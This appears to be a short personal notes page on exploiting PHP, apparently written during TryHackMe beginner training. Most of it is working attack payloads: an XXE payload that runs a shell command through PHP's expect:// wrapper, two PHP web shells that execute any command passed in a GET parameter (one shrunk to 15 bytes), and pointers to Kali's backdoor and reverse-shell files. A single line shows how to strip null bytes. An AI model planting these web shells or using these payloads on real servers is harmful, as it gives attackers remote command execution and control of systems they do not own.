# Exploiting PHP

author:: Nathan Acks  
date:: 2022-02-03

## RCE via XXE

RCE through XEE is apparently rare, but can be achieved via the PHP expect module.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxerce SYSTEM "expect://id">]>
<root>&xxerce;</root>
```

## The Poison Null Byte

PHP string parsing is susceptible to the poison null byte.

The best way to defend against these attacks is to simply sanitize strings by explicitly removing any null bytes they contain.

```php
$sanitized_string = str_replace(chr(0), '', $original_string);  
```

## Web-Based RCE

```php
<?php
	echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
?>
```

A slightly spruced-up version of this is available on Kali Linux as `/usr/share/webshells/php/simple-backdoor.php`.

On space-constrained systems, you can compact this down to just 15 bytes:

```php
<?=`$_GET[1]`?>
```

## Reverse Shell

Check out `/usr/share/webshells/php/php-reverse-shell.php` on Kali Linux. Note that this only works on UNIX-like systems.

## References

* [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
* [Exploitation: XML External Entity (XXE) Injection](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)
* [Common PHP attacks: Poison Null Byte](https://defendtheweb.net/article/common-php-attacks-poison-null-byte)
* [XXE (XML External Entity) Attacks](xml-external-entity-attacks.md)
* [The Poison Null Byte](poison-null-byte.md)
* [Podalirius on Twitter](https://twitter.com/podalirius_/status/1488921781637365771)
